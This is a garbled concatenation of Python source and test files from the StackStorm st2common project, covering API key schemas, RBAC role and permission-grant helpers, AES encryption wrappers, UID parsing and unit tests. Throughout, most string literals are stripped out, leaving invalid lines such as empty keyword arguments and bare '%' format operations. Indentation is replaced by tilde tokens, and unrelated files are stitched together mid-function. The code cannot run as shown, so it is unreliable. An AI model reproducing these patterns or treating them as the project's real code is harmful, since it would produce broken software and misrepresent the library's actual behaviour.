model = cls . model ( user = user , token = token , expiry = expiry ) \n 
return model \n 
\n 
\n 
~~ ~~ class ApiKeyAPI ( BaseAPI ) : \n 
~~~ model = ApiKeyDB \n 
schema = { \n 
"title" : "ApiKey" , \n 
"type" : "object" , \n 
"properties" : { \n 
"id" : { \n 
"type" : "string" \n 
} , \n 
"uid" : { \n 
"type" : "string" \n 
} , \n 
"user" : { \n 
"type" : [ "string" , "null" ] , \n 
"default" : "" \n 
} , \n 
"key_hash" : { \n 
"type" : [ "string" , "null" ] \n 
} , \n 
"metadata" : { \n 
"type" : [ "object" , "null" ] \n 
} , \n 
: { \n 
: , \n 
: , \n 
: isotime . ISO8601_UTC_REGEX \n 
} , \n 
"enabled" : { \n 
"description" : "Enable or disable the action from invocation." , \n 
"type" : "boolean" , \n 
"default" : True \n 
} \n 
} , \n 
"additionalProperties" : False \n 
} \n 
\n 
@ classmethod \n 
def from_model ( cls , model , mask_secrets = False ) : \n 
~~~ doc = super ( cls , cls ) . _from_model ( model , mask_secrets = mask_secrets ) \n 
doc [ ] = isotime . format ( model . created_at , offset = False ) if model . created_at else None \n 
return cls ( ** doc ) \n 
\n 
~~ @ classmethod \n 
def to_model ( cls , instance ) : \n 
~~~ user = str ( instance . user ) if instance . user else None \n 
key_hash = getattr ( instance , , None ) \n 
metadata = getattr ( instance , , { } ) \n 
enabled = bool ( getattr ( instance , , True ) ) \n 
model = cls . model ( user = user , key_hash = key_hash , metadata = metadata , enabled = enabled ) \n 
return model \n 
\n 
\n 
~~ ~~ class ApiKeyCreateResponseAPI ( BaseAPI ) : \n 
~~~ schema = { \n 
"title" : "APIKeyCreateResponse" , \n 
"type" : "object" , \n 
"properties" : { \n 
"id" : { \n 
"type" : "string" \n 
} , \n 
"uid" : { \n 
"type" : "string" \n 
} , \n 
"user" : { \n 
"type" : [ "string" , "null" ] , \n 
"default" : "" \n 
} , \n 
"key" : { \n 
"type" : [ "string" , "null" ] \n 
} , \n 
"metadata" : { \n 
"type" : [ "object" , "null" ] \n 
} , \n 
: { \n 
: , \n 
: , \n 
: isotime . ISO8601_UTC_REGEX \n 
} , \n 
"enabled" : { \n 
"description" : "Enable or disable the action from invocation." , \n 
"type" : "boolean" , \n 
"default" : True \n 
} \n 
} , \n 
"additionalProperties" : False \n 
} \n 
\n 
@ classmethod \n 
def from_model ( cls , model , mask_secrets = False ) : \n 
~~~ doc = cls . _from_model ( model = model , mask_secrets = mask_secrets ) \n 
attrs = { attr : value for attr , value in six . iteritems ( doc ) if value is not None } \n 
attrs [ ] = isotime . format ( model . created_at , offset = False ) if model . created_at else None \n 
# key_hash is ignored. \n 
attrs . pop ( , None ) \n 
# key is unknown so the calling code will have to update after conversion. \n 
attrs [ ] = None \n 
\n 
return cls ( ** attrs ) \n 
\n 
# contributor license agreements.  See the NOTICE file distributed with \n 
# this work for additional information regarding copyright ownership. \n 
# The ASF licenses this file to You under the Apache License, Version 2.0 \n 
# (the "License"); you may not use this file except in compliance with \n 
# the License.  You may obtain a copy of the License at \n 
# \n 
#     http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
~~ ~~ from st2common . models . db . rule import ( ActionExecutionSpecDB , RuleDB ) \n 
from st2common . models . db . sensor import SensorTypeDB \n 
from st2common . models . db . trigger import ( TriggerDB , TriggerTypeDB , TriggerInstanceDB ) \n 
\n 
__all__ = [ \n 
, \n 
, \n 
, \n 
, \n 
, \n 
\n 
] \n 
\n 
MODELS = [ RuleDB , SensorTypeDB , TriggerDB , TriggerInstanceDB , \n 
TriggerTypeDB ] \n 
\n 
# contributor license agreements.  See the NOTICE file distributed with \n 
# this work for additional information regarding copyright ownership. \n 
# The ASF licenses this file to You under the Apache License, Version 2.0 \n 
# (the "License"); you may not use this file except in compliance with \n 
# the License.  You may obtain a copy of the License at \n 
# \n 
#     http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
from st2common . models . db import MongoDBAccess \n 
from st2common . models . db . marker import MarkerDB \n 
from st2common . models . db . marker import DumperMarkerDB \n 
from st2common . persistence . base import Access \n 
\n 
__all__ = [ \n 
\n 
] \n 
\n 
\n 
class Marker ( Access ) : \n 
~~~ impl = MongoDBAccess ( MarkerDB ) \n 
publisher = None \n 
\n 
@ classmethod \n 
def _get_impl ( cls ) : \n 
~~~ return cls . impl \n 
\n 
\n 
~~ ~~ class DumperMarker ( Access ) : \n 
~~~ impl = MongoDBAccess ( DumperMarkerDB ) \n 
publisher = None \n 
\n 
@ classmethod \n 
def _get_impl ( cls ) : \n 
~~~ return cls . impl \n 
\n 
# contributor license agreements.  See the NOTICE file distributed with \n 
# this work for additional information regarding copyright ownership. \n 
# The ASF licenses this file to You under the Apache License, Version 2.0 \n 
# (the "License"); you may not use this file except in compliance with \n 
# the License.  You may obtain a copy of the License at \n 
# \n 
#     http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
~~ ~~ from st2common . rbac . types import PermissionType \n 
from st2common . rbac . types import ResourceType \n 
from st2common . rbac . types import SystemRole \n 
from st2common . persistence . rbac import Role \n 
from st2common . persistence . rbac import UserRoleAssignment \n 
from st2common . persistence . rbac import PermissionGrant \n 
from st2common . models . db . rbac import RoleDB \n 
from st2common . models . db . rbac import UserRoleAssignmentDB \n 
from st2common . models . db . rbac import PermissionGrantDB \n 
\n 
\n 
__all__ = [ \n 
, \n 
, \n 
, \n 
, \n 
, \n 
\n 
, \n 
, \n 
\n 
, \n 
, \n 
\n 
, \n 
, \n 
, \n 
\n 
] \n 
\n 
\n 
def get_all_roles ( exclude_system = False ) : \n 
~~~ """\n    Retrieve all the available roles.\n\n    :param exclude_system: True to exclude system roles.\n    :type exclude_system: ``bool``\n\n    :rtype: ``list`` of :class:`RoleDB`\n    """ \n 
if exclude_system : \n 
~~~ result = Role . query ( system = False ) \n 
~~ else : \n 
~~~ result = Role . get_all ( ) \n 
\n 
~~ return result \n 
\n 
\n 
~~ def get_system_roles ( ) : \n 
~~~ """\n    Retrieve all the available system roles.\n\n    :rtype: ``list`` of :class:`RoleDB`\n    """ \n 
result = Role . query ( system = True ) \n 
return result \n 
\n 
\n 
~~ def get_roles_for_user ( user_db ) : \n 
~~~ """\n    Retrieve all the roles assigned to the provided user.\n\n    :param user_db: User to retrieve the roles for.\n    :type user_db: :class:`UserDB`\n\n    :rtype: ``list`` of :class:`RoleDB`\n    """ \n 
role_names = UserRoleAssignment . query ( user = user_db . name ) . only ( ) . scalar ( ) \n 
result = Role . query ( name__in = role_names ) \n 
return result \n 
\n 
\n 
~~ def get_role_assignments_for_user ( user_db ) : \n 
~~~ """\n    Retrieve all the UserRoleAssignmentDB objects for a particular user.\n\n    :param user_db: User to retrieve the role assignments for.\n    :type user_db: :class:`UserDB`\n\n    :rtype: ``list`` of :class:`UserRoleAssignmentDB`\n    """ \n 
result = UserRoleAssignment . query ( user = user_db . name ) \n 
return result \n 
\n 
\n 
~~ def get_role_by_name ( name ) : \n 
~~~ """\n    Retrieve role by name.\n\n    :rtype: ``list`` of :class:`RoleDB`\n    """ \n 
result = Role . get ( name = name ) \n 
return result \n 
\n 
\n 
~~ def create_role ( name , description = None ) : \n 
~~~ """\n    Create a new role.\n    """ \n 
if name in SystemRole . get_valid_values ( ) : \n 
~~~ raise ValueError ( \'"%s" role name is blacklisted\' % ( name ) ) \n 
\n 
~~ role_db = RoleDB ( name = name , description = description ) \n 
role_db = Role . add_or_update ( role_db ) \n 
return role_db \n 
\n 
\n 
~~ def delete_role ( name ) : \n 
~~~ """"\n    Delete role with the provided name.\n    """ \n 
if name in SystemRole . get_valid_values ( ) : \n 
~~~ raise ValueError ( ) \n 
\n 
~~ role_db = Role . get ( name = name ) \n 
result = Role . delete ( role_db ) \n 
return result \n 
\n 
\n 
~~ def assign_role_to_user ( role_db , user_db , description = None ) : \n 
~~~ """\n    Assign role to a user.\n\n    :param role_db: Role to assign.\n    :type role_db: :class:`RoleDB`\n\n    :param user_db: User to assign the role to.\n    :type user_db: :class:`UserDB`\n\n    :param description: Optional assingment description.\n    :type description: ``str``\n    """ \n 
role_assignment_db = UserRoleAssignmentDB ( user = user_db . name , role = role_db . name , \n 
description = description ) \n 
role_assignment_db = UserRoleAssignment . add_or_update ( role_assignment_db ) \n 
return role_assignment_db \n 
\n 
\n 
~~ def revoke_role_from_user ( role_db , user_db ) : \n 
~~~ """\n    Revoke role from a user.\n\n    :param role_db: Role to revoke.\n    :type role_db: :class:`RoleDB`\n\n    :param user_db: User to revoke the role from.\n    :type user_db: :class:`UserDB`\n    """ \n 
role_assignment_db = UserRoleAssignment . get ( user = user_db . name , role = role_db . name ) \n 
result = UserRoleAssignment . delete ( role_assignment_db ) \n 
return result \n 
\n 
\n 
~~ def get_all_permission_grants_for_user ( user_db , resource_uid = None , resource_types = None , \n 
permission_types = None ) : \n 
~~~ """\n    Retrieve all the permission grants for a particular user optionally filtering on:\n\n    - Resource uid\n    - Resource types\n    - Permission types\n\n    The result is a union of all the permission grants assigned to the roles which are assigned to\n    the user.\n\n    :rtype: ``list`` or :class:`PermissionGrantDB`\n    """ \n 
role_names = UserRoleAssignment . query ( user = user_db . name ) . only ( ) . scalar ( ) \n 
permission_grant_ids = Role . query ( name__in = role_names ) . scalar ( ) \n 
permission_grant_ids = sum ( permission_grant_ids , [ ] ) \n 
\n 
permission_grants_filters = { } \n 
permission_grants_filters [ ] = permission_grant_ids \n 
\n 
if resource_uid : \n 
~~~ permission_grants_filters [ ] = resource_uid \n 
\n 
~~ if resource_types : \n 
~~~ permission_grants_filters [ ] = resource_types \n 
\n 
~~ if permission_types : \n 
~~~ permission_grants_filters [ ] = permission_types \n 
\n 
~~ permission_grant_dbs = PermissionGrant . query ( ** permission_grants_filters ) \n 
return permission_grant_dbs \n 
\n 
\n 
~~ def create_permission_grant_for_resource_db ( role_db , resource_db , permission_types ) : \n 
~~~ """\n    Create a new permission grant for a resource and add it to the provided role.\n\n    :param role_db: Role to add the permission assignment to.\n    :type role_db: :class:`RoleDB`\n\n    :param resource_db: Resource to create the permission assignment for.\n    :type resource_db: :class:`StormFoundationDB`\n    """ \n 
permission_types = _validate_permission_types ( resource_db = resource_db , \n 
permission_types = permission_types ) \n 
\n 
resource_uid = resource_db . get_uid ( ) \n 
resource_type = resource_db . get_resource_type ( ) \n 
\n 
result = create_permission_grant ( role_db = role_db , resource_uid = resource_uid , \n 
resource_type = resource_type , \n 
permission_types = permission_types ) \n 
return result \n 
\n 
\n 
~~ def create_permission_grant ( role_db , resource_uid , resource_type , permission_types ) : \n 
~~~ """\n    Create a new permission grant and add it to the provided role.\n\n    :param role_db: Role to add the permission assignment to.\n    :type role_db: :class:`RoleDB`\n    """ \n 
# Create or update the PermissionGrantDB \n 
permission_grant_db = PermissionGrantDB ( resource_uid = resource_uid , \n 
resource_type = resource_type , \n 
permission_types = permission_types ) \n 
permission_grant_db = PermissionGrant . add_or_update ( permission_grant_db ) \n 
\n 
# Add assignment to the role \n 
role_db . update ( push__permission_grants = permission_grant_db . id ) \n 
\n 
return permission_grant_db \n 
\n 
\n 
~~ def remove_permission_grant_for_resource_db ( role_db , resource_db , permission_types ) : \n 
~~~ """\n    Remove a permission grant from a role.\n\n    :param role_db: Role to remove the permission assignment from.\n    :type role_db: :class:`RoleDB`\n\n    :param resource_db: Resource to remove the permission assignment from.\n    :type resource_db: :class:`StormFoundationDB`\n    """ \n 
permission_types = _validate_permission_types ( resource_db = resource_db , \n 
permission_types = permission_types ) \n 
resource_uid = resource_db . get_uid ( ) \n 
resource_type = resource_db . get_resource_type ( ) \n 
permission_grant_db = PermissionGrant . get ( resource_uid = resource_uid , \n 
resource_type = resource_type , \n 
permission_types = permission_types ) \n 
\n 
# Remove assignment from a role \n 
role_db . update ( pull__permission_grants = permission_grant_db . id ) \n 
\n 
return permission_grant_db \n 
\n 
\n 
~~ def _validate_resource_type ( resource_db ) : \n 
~~~ """\n    Validate that the permissions can be manipulated for the provided resource type.\n    """ \n 
resource_type = resource_db . get_resource_type ( ) \n 
valid_resource_types = ResourceType . get_valid_values ( ) \n 
\n 
if resource_type not in valid_resource_types : \n 
~~~ raise ValueError ( % \n 
( resource_type ) ) \n 
\n 
~~ return resource_db \n 
\n 
\n 
~~ def _validate_permission_types ( resource_db , permission_types ) : \n 
~~~ """\n    Validate that the permission_types list only contains valid values for the\n    provided resource.\n    """ \n 
resource_db = _validate_resource_type ( resource_db = resource_db ) \n 
resource_type = resource_db . get_resource_type ( ) \n 
valid_permission_types = PermissionType . get_valid_permissions_for_resource_type ( resource_type ) \n 
\n 
for permission_type in permission_types : \n 
~~~ if permission_type not in valid_permission_types : \n 
~~~ raise ValueError ( % ( permission_type ) ) \n 
\n 
~~ ~~ return permission_types \n 
\n 
# contributor license agreements.  See the NOTICE file distributed with \n 
# this work for additional information regarding copyright ownership. \n 
# The ASF licenses this file to You under the Apache License, Version 2.0 \n 
# (the "License"); you may not use this file except in compliance with \n 
# the License.  You may obtain a copy of the License at \n 
# \n 
#     http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
~~ import binascii \n 
\n 
\n 
def symmetric_encrypt ( encrypt_key , message ) : \n 
~~~ """\n    Encrypt the given message using the encrypt_key. Returns a UTF-8 str\n    ready to be stored in database. Note that we convert the hex notation\n    to a ASCII notation to produce a UTF-8 friendly string.\n\n    Also, this method will not return the same output on multiple invocations\n    of same method. The reason is that the Encrypt method uses a different\n    \'Initialization Vector\' per run and the IV is part of the output.\n\n    :param encrypt_key: Symmetric AES key to use for encryption.\n    :type encrypt_key: :class:`keyczar.keys.AesKey`\n\n    :param message: Message to be encrypted.\n    :type message: ``str``\n\n    :rtype: ``str``\n    """ \n 
return binascii . hexlify ( encrypt_key . Encrypt ( message ) ) . upper ( ) \n 
\n 
\n 
~~ def symmetric_decrypt ( decrypt_key , crypto ) : \n 
~~~ """\n    Decrypt the given crypto text into plain text. Returns the original\n    string input. Note that we first convert the string to hex notation\n    and then decrypt. This is reverse of the encrypt operation.\n\n    :param decrypt_key: Symmetric AES key to use for decryption.\n    :type decrypt_key: :class:`keyczar.keys.AesKey`\n\n    :param crypto: Crypto text to be decrypted.\n    :type crypto: ``str``\n\n    :rtype: ``str``\n    """ \n 
return decrypt_key . Decrypt ( binascii . unhexlify ( crypto ) ) \n 
\n 
# contributor license agreements.  See the NOTICE file distributed with \n 
# this work for additional information regarding copyright ownership. \n 
# The ASF licenses this file to You under the Apache License, Version 2.0 \n 
# (the "License"); you may not use this file except in compliance with \n 
# the License.  You may obtain a copy of the License at \n 
# \n 
#     http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
~~ """\nModule containing model UID related utility functions.\n""" \n 
\n 
from st2common . models . db . stormbase import UIDFieldMixin \n 
\n 
__all__ = [ \n 
\n 
] \n 
\n 
\n 
def parse_uid ( uid ) : \n 
~~~ """\n    Parse UID string.\n\n    :return: (ResourceType, uid_remainder)\n    :rtype: ``tuple``\n    """ \n 
if UIDFieldMixin . UID_SEPARATOR not in uid : \n 
~~~ raise ValueError ( % ( uid ) ) \n 
\n 
~~ parsed = uid . split ( UIDFieldMixin . UID_SEPARATOR ) \n 
\n 
if len ( parsed ) < 2 : \n 
~~~ raise ValueError ( % ( uid ) ) \n 
\n 
~~ resource_type = parsed [ 0 ] \n 
uid_remainder = parsed [ 1 : ] \n 
\n 
return ( resource_type , uid_remainder ) \n 
\n 
# contributor license agreements.  See the NOTICE file distributed with \n 
# this work for additional information regarding copyright ownership. \n 
# The ASF licenses this file to You under the Apache License, Version 2.0 \n 
# (the "License"); you may not use this file except in compliance with \n 
# the License.  You may obtain a copy of the License at \n 
# \n 
#     http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
~~ import os \n 
\n 
from st2common . bootstrap import aliasesregistrar \n 
from st2tests import DbTestCase , fixturesloader \n 
\n 
\n 
ALIASES_FIXTURE_PACK_PATH = os . path . join ( fixturesloader . get_fixtures_base_path ( ) , ) \n 
ALIASES_FIXTURE_PATH = os . path . join ( ALIASES_FIXTURE_PACK_PATH , ) \n 
\n 
\n 
class TestAliasRegistrar ( DbTestCase ) : \n 
\n 
~~~ def test_alias_registration ( self ) : \n 
~~~ count = aliasesregistrar . register_aliases ( pack_dir = ALIASES_FIXTURE_PACK_PATH ) \n 
# expect all files to contain be aliases \n 
self . assertEqual ( count , len ( os . listdir ( ALIASES_FIXTURE_PATH ) ) ) \n 
\n 
# contributor license agreements.  See the NOTICE file distributed with \n 
# this work for additional information regarding copyright ownership. \n 
# The ASF licenses this file to You under the Apache License, Version 2.0 \n 
# (the "License"); you may not use this file except in compliance with \n 
# the License.  You may obtain a copy of the License at \n 
# \n 
#     http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
~~ ~~ from st2tests . base import CleanDbTestCase \n 
from st2common . models . db . keyvalue import KeyValuePairDB \n 
from st2common . persistence . keyvalue import KeyValuePair \n 
from st2common . services . keyvalues import KeyValueLookup \n 
\n 
\n 
class TestKeyValueLookup ( CleanDbTestCase ) : \n 
\n 
~~~ def test_non_hierarchical_lookup ( self ) : \n 
~~~ k1 = KeyValuePair . add_or_update ( KeyValuePairDB ( name = , value = ) ) \n 
k2 = KeyValuePair . add_or_update ( KeyValuePairDB ( name = , value = ) ) \n 
k3 = KeyValuePair . add_or_update ( KeyValuePairDB ( name = , value = ) ) \n 
\n 
lookup = KeyValueLookup ( ) \n 
self . assertEquals ( str ( lookup . k1 ) , k1 . value ) \n 
self . assertEquals ( str ( lookup . k2 ) , k2 . value ) \n 
self . assertEquals ( str ( lookup . k3 ) , k3 . value ) \n 
\n 
~~ def test_hierarchical_lookup_dotted ( self ) : \n 
~~~ k1 = KeyValuePair . add_or_update ( KeyValuePairDB ( name = , value = ) ) \n 
k2 = KeyValuePair . add_or_update ( KeyValuePairDB ( name = , value = ) ) \n 
k3 = KeyValuePair . add_or_update ( KeyValuePairDB ( name = , value = ) ) \n 
\n 
lookup = KeyValueLookup ( ) \n 
self . assertEquals ( str ( lookup . a . b ) , k1 . value ) \n 
self . assertEquals ( str ( lookup . a . b . c ) , k2 . value ) \n 
self . assertEquals ( str ( lookup . b . c ) , k3 . value ) \n 
self . assertEquals ( str ( lookup . a ) , ) \n 
\n 
~~ def test_hierarchical_lookup_dict ( self ) : \n 
~~~ k1 = KeyValuePair . add_or_update ( KeyValuePairDB ( name = , value = ) ) \n 
k2 = KeyValuePair . add_or_update ( KeyValuePairDB ( name = , value = ) ) \n 
k3 = KeyValuePair . add_or_update ( KeyValuePairDB ( name = , value = ) ) \n 
\n 
lookup = KeyValueLookup ( ) \n 
self . assertEquals ( str ( lookup [ ] [ ] ) , k1 . value ) \n 
self . assertEquals ( str ( lookup [ ] [ ] [ ] ) , k2 . value ) \n 
self . assertEquals ( str ( lookup [ ] [ ] ) , k3 . value ) \n 
self . assertEquals ( str ( lookup [ ] ) , ) \n 
\n 
~~ def test_missing_key_lookup ( self ) : \n 
~~~ lookup = KeyValueLookup ( ) \n 
self . assertEquals ( str ( lookup . missing_key ) , ) \n 
self . assertTrue ( lookup . missing_key , ) \n 
\n 
~~ def test_secret_lookup ( self ) : \n 
~~~ secret_value = + \n 
k1 = KeyValuePair . add_or_update ( KeyValuePairDB ( \n 
name = , value = secret_value , \n 
secret = True , encrypted = True ) \n 
) \n 
k2 = KeyValuePair . add_or_update ( KeyValuePairDB ( name = , value = ) ) \n 
\n 
lookup = KeyValueLookup ( ) \n 
self . assertEquals ( str ( lookup . k1 ) , k1 . value ) \n 
self . assertEquals ( str ( lookup . k2 ) , k2 . value ) \n 
\n 
# contributor license agreements.  See the NOTICE file distributed with \n 
# this work for additional information regarding copyright ownership. \n 
# The ASF licenses this file to You under the Apache License, Version 2.0 \n 
# (the "License"); you may not use this file except in compliance with \n 
# the License.  You may obtain a copy of the License at \n 
# \n 
#     http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
~~ ~~ __all__ = [ \n 
\n 
] \n 
\n 
import bson \n 
\n 
from st2common . triggers import register_internal_trigger_types \n 
from st2common . rbac . types import PermissionType \n 
from st2common . rbac . types import ResourceType \n 
from st2common . persistence . auth import User \n 
from st2common . persistence . rbac import Role \n 
from st2common . persistence . rbac import UserRoleAssignment \n 
from st2common . persistence . rbac import PermissionGrant \n 
from st2common . persistence . rule import Rule \n 
from st2common . persistence . rule_enforcement import RuleEnforcement \n 
from st2common . models . db . auth import UserDB \n 
from st2common . models . db . rbac import RoleDB \n 
from st2common . models . db . rbac import UserRoleAssignmentDB \n 
from st2common . models . db . rbac import PermissionGrantDB \n 
from st2common . models . db . rule import RuleDB \n 
from st2common . models . db . rule_enforcement import RuleEnforcementDB \n 
from st2common . rbac . resolvers import RuleEnforcementPermissionsResolver \n 
from tests . unit . test_rbac_resolvers import BasePermissionsResolverTestCase \n 
\n 
\n 
class RuleEnforcementPermissionsResolverTestCase ( BasePermissionsResolverTestCase ) : \n 
~~~ def setUp ( self ) : \n 
~~~ super ( RuleEnforcementPermissionsResolverTestCase , self ) . setUp ( ) \n 
\n 
register_internal_trigger_types ( ) \n 
\n 
# Create some mock users \n 
user_1_db = UserDB ( name = ) \n 
user_1_db = User . add_or_update ( user_1_db ) \n 
self . users [ ] = user_1_db \n 
\n 
user_2_db = UserDB ( name = ) \n 
user_2_db = User . add_or_update ( user_2_db ) \n 
self . users [ ] = user_2_db \n 
\n 
user_3_db = UserDB ( name = ) \n 
user_3_db = User . add_or_update ( user_3_db ) \n 
self . users [ ] = user_3_db \n 
\n 
user_4_db = UserDB ( name = ) \n 
user_4_db = User . add_or_update ( user_4_db ) \n 
self . users [ ] = user_4_db \n 
\n 
user_5_db = UserDB ( name = ) \n 
user_5_db = User . add_or_update ( user_5_db ) \n 
self . users [ ] = user_5_db \n 
\n 
user_6_db = UserDB ( name = ) \n 
user_6_db = User . add_or_update ( user_6_db ) \n 
self . users [ ] = user_6_db \n 
\n 
user_7_db = UserDB ( name = ) \n 
user_7_db = User . add_or_update ( user_7_db ) \n 
self . users [ ] = user_7_db \n 
\n 
user_8_db = UserDB ( name = ) \n 
user_8_db = User . add_or_update ( user_8_db ) \n 
self . users [ ] = user_8_db \n 
\n 
user_9_db = UserDB ( name = ) \n 
user_9_db = User . add_or_update ( user_9_db ) \n 
self . users [ ] = user_9_db \n 
\n 
user_10_db = UserDB ( name = ) \n 
user_10_db = User . add_or_update ( user_10_db ) \n 
self . users [ ] = user_10_db \n 
\n 
# Create some mock resources on which permissions can be granted \n 
rule_1_db = RuleDB ( pack = , name = , action = { : } , \n 
trigger = ) \n 
rule_1_db = Rule . add_or_update ( rule_1_db ) \n 
self . resources [ ] = rule_1_db \n 
\n 
rule_enforcement_1_db = RuleEnforcementDB ( trigger_instance_id = str ( bson . ObjectId ( ) ) , \n 
execution_id = str ( bson . ObjectId ( ) ) , \n 
rule = { : rule_1_db . ref , \n 
: rule_1_db . uid , \n 
: str ( rule_1_db . id ) } ) \n 
rule_enforcement_1_db = RuleEnforcement . add_or_update ( rule_enforcement_1_db ) \n 
self . resources [ ] = rule_enforcement_1_db \n 
\n 
rule_2_db = RuleDB ( pack = , name = ) \n 
rule_2_db = Rule . add_or_update ( rule_2_db ) \n 
self . resources [ ] = rule_2_db \n 
\n 
rule_enforcement_2_db = RuleEnforcementDB ( trigger_instance_id = str ( bson . ObjectId ( ) ) , \n 
execution_id = str ( bson . ObjectId ( ) ) , \n 
rule = { : rule_2_db . ref , \n 
: rule_2_db . uid , \n 
: str ( rule_2_db . id ) } ) \n 
rule_enforcement_2_db = RuleEnforcement . add_or_update ( rule_enforcement_2_db ) \n 
self . resources [ ] = rule_enforcement_2_db \n 
\n 
rule_3_db = RuleDB ( pack = , name = ) \n 
rule_3_db = Rule . add_or_update ( rule_3_db ) \n 
self . resources [ ] = rule_3_db \n 
\n 
rule_enforcement_3_db = RuleEnforcementDB ( trigger_instance_id = str ( bson . ObjectId ( ) ) , \n 
execution_id = str ( bson . ObjectId ( ) ) , \n 
rule = { : rule_3_db . ref , \n 
: rule_3_db . uid , \n 
: str ( rule_3_db . id ) } ) \n 
rule_enforcement_3_db = RuleEnforcement . add_or_update ( rule_enforcement_3_db ) \n 
self . resources [ ] = rule_enforcement_3_db \n 
\n 
# Create some mock roles with associated permission grants \n 
# Custom role 2 - one grant on parent pack \n 
# "rule_view" on pack_1 \n 
grant_db = PermissionGrantDB ( resource_uid = self . resources [ ] . get_uid ( ) , \n 
resource_type = ResourceType . PACK , \n 
permission_types = [ PermissionType . RULE_VIEW ] ) \n 
grant_db = PermissionGrant . add_or_update ( grant_db ) \n 
permission_grants = [ str ( grant_db . id ) ] \n 
role_3_db = RoleDB ( name = , \n 
permission_grants = permission_grants ) \n 
role_3_db = Role . add_or_update ( role_3_db ) \n 
self . roles [ ] = role_3_db \n 
\n 
# Custom role 4 - one grant on rule \n 
# "rule_view on rule_3 \n 
grant_db = PermissionGrantDB ( resource_uid = self . resources [ ] . get_uid ( ) , \n 
resource_type = ResourceType . RULE , \n 
permission_types = [ PermissionType . RULE_VIEW ] ) \n 
grant_db = PermissionGrant . add_or_update ( grant_db ) \n 
permission_grants = [ str ( grant_db . id ) ] \n 
role_4_db = RoleDB ( name = , permission_grants = permission_grants ) \n 
role_4_db = Role . add_or_update ( role_4_db ) \n 
self . roles [ ] = role_4_db \n 
\n 
# Custom role - "rule_all" grant on a parent rule pack \n 
grant_db = PermissionGrantDB ( resource_uid = self . resources [ ] . get_uid ( ) , \n 
resource_type = ResourceType . PACK , \n 
permission_types = [ PermissionType . RULE_ALL ] ) \n 
grant_db = PermissionGrant . add_or_update ( grant_db ) \n 
permission_grants = [ str ( grant_db . id ) ] \n 
role_4_db = RoleDB ( name = , \n 
permission_grants = permission_grants ) \n 
role_4_db = Role . add_or_update ( role_4_db ) \n 
self . roles [ ] = role_4_db \n 
\n 
# Custom role - "rule_all" grant on a rule \n 
grant_db = PermissionGrantDB ( resource_uid = self . resources [ ] . get_uid ( ) , \n 
resource_type = ResourceType . RULE , \n 
permission_types = [ PermissionType . RULE_ALL ] ) \n 
grant_db = PermissionGrant . add_or_update ( grant_db ) \n 
permission_grants = [ str ( grant_db . id ) ] \n 
role_4_db = RoleDB ( name = , permission_grants = permission_grants ) \n 
role_4_db = Role . add_or_update ( role_4_db ) \n 
self . roles [ ] = role_4_db \n 
\n 
# Custom role - "rule_modify" on role_1 \n 
grant_db = PermissionGrantDB ( resource_uid = self . resources [ ] . get_uid ( ) , \n 
resource_type = ResourceType . RULE , \n 
permission_types = [ PermissionType . RULE_MODIFY ] ) \n 
grant_db = PermissionGrant . add_or_update ( grant_db ) \n 
permission_grants = [ str ( grant_db . id ) ] \n 
role_5_db = RoleDB ( name = , \n 
permission_grants = permission_grants ) \n 
role_5_db = Role . add_or_update ( role_5_db ) \n 
self . roles [ ] = role_5_db \n 
\n 
# Custom role - "rule_create" grant on pack_1 \n 
grant_db = PermissionGrantDB ( resource_uid = self . resources [ ] . get_uid ( ) , \n 
resource_type = ResourceType . PACK , \n 
permission_types = [ PermissionType . RULE_CREATE ] ) \n 
grant_db = PermissionGrant . add_or_update ( grant_db ) \n 
permission_grants = [ str ( grant_db . id ) ] \n 
role_6_db = RoleDB ( name = , \n 
permission_grants = permission_grants ) \n 
role_6_db = Role . add_or_update ( role_6_db ) \n 
self . roles [ ] = role_6_db \n 
\n 
# Custom role - "rule_all" grant on pack_1 \n 
grant_db = PermissionGrantDB ( resource_uid = self . resources [ ] . get_uid ( ) , \n 
resource_type = ResourceType . PACK , \n 
permission_types = [ PermissionType . RULE_ALL ] ) \n 
grant_db = PermissionGrant . add_or_update ( grant_db ) \n 
permission_grants = [ str ( grant_db . id ) ] \n 
role_7_db = RoleDB ( name = , \n 
